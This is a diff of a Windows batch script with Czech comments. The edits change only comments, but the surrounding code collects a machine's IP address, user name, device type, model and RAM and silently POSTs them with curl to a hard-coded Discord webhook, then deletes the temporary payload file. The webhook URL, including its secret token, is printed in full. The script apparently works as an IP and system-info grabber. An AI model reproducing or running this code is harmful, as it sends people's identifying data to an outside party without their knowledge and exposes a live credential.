@@ -2,8 +2,6 @@
 chcp 65001 >nul
 setlocal EnableDelayedExpansion
 
-:: ──────────────── SYSTEMOVÉ INFO ────────────────
-
 :: 🌐 Webhook
 set "webhook=https://discord.com/api/webhooks/1439411134137499698/1LxkdwQcxAxk-N_ZDkZQ1TRUiAgqiaqhPpkgcN6KIiFO1m5PWw6aDAm0cFOE445el1c8"
 
@@ -44,8 +42,7 @@ set /a ram=%ramRaw:~0,-6%
 :: 🧾 Zpráva
 set "msg=🛰️ IP: ||!ip!||\nČas: !timestamp!\nUživatel: !user!\nZařízení: !deviceType!\nModel: !deviceModel!\nRAM: !ram! GB"
 
-:: ──────────────── ODESLÁNÍ NA WEBHOOK ────────────────
-
+:: 📤 Odeslání na webhook
 set "payload=%TEMP%\payload.json"
 echo { > "!payload!"
 echo   "content": "!msg!" >> "!payload!"
@@ -53,5 +50,4 @@ echo } >> "!payload!"
 curl -s -X POST %webhook% -H "Content-Type: application/json" --data "@!payload!" >nul
 del /f /q "!payload!"
 
-:: ✅ Hotovo
 exit
